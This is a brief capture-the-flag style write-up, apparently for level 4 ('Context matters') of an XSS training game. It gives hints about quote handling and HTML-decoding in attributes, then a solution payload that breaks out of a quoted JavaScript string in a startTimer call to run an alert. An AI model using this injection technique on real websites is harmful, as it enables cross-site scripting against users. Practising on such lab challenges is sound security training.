---
title: Level 4 - Context matters
edit_url: null
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/user-attachments/assets/d1a05303-dd07-409f-884a-091adcdd6bfc?raw=1)
</figure>

## Hints

> 1. Take a look at how the `startTimer` function is called.

> 2. When browsers parse tag attributes, they HTML-decode their values first. `<foo bar='z'>` is the same as `<foo bar='&#x7a;'`

> 3. Try entering a single quote (') and watch the error console.

## Exploitation

### Payload

We can provide the following payload to solve this problem:

```
1'); alert('1
```

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/user-attachments/assets/bea78ac7-e658-4188-b4fb-3a085648bdf3?raw=1)
</figure>
